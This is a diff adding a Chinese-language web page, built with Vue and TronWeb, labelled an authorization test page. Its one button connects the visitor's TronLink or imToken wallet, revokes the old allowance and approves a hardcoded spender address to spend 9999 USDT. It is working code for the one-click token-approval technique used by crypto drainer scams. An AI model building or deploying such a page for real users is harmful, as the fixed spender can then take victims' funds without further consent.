@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>授权测试页面（兼容USDT要求）</title>
+  <script src="https://cdn.jsdelivr.net/npm/vue@3.2.47/dist/vue.global.prod.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f7f7f7; }
+    h1 { text-align: center; font-size: 1.5em; }
+    button { width: 100%; padding: 15px; font-size: 1rem; margin-top: 20px; border-radius: 8px; border: none; background-color: #28a745; color: white; }
+    pre { background-color: #eee; padding: 10px; border-radius: 8px; white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
+    .container { max-width: 600px; margin: auto; }
+  </style>
+</head>
+<body>
+  <div id="app" class="container">
+    <h1>一键授权：9999 USDT 给指定地址</h1>
+    <button @click="authorizeUSDT">开始授权</button>
+    <pre v-if="result">{{ result }}</pre>
+  </div>
+
+  <script>
+    const { createApp } = Vue;
+    const spender = "TQfrsE1L52PCKq9YWyU3cvFF19xu5EPPsP";
+    const usdtAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
+
+    createApp({
+      data() {
+        return { result: "" };
+      },
+      methods: {
+        async authorizeUSDT() {
+          this.result = "正在连接钱包...";
+          if (!window.tronWeb || !window.tronWeb.ready) {
+            this.result = "未检测到 TronLink / imToken 或钱包未连接";
+            return;
+          }
+          const tronWeb = window.tronWeb;
+          try {
+            const contract = await tronWeb.contract().at(usdtAddress);
+            this.result = "步骤1：撤销旧授权...";
+            await contract.approve(spender, 0).send();
+            this.result = "步骤1成功，步骤2：授权9999 USDT 中...";
+            await contract.approve(spender, tronWeb.toSun(9999)).send();
+            this.result = "✅ 授权成功：9999 USDT 授权给 " + spender;
+          } catch (e) {
+            console.error("授权错误：", e);
+            this.result = "❌ 授权失败：\n" + (e?.message || JSON.stringify(e, null, 2));
+          }
+        }
+      }
+    }).mount("#app");
+  </script>
+</body>
+</html>
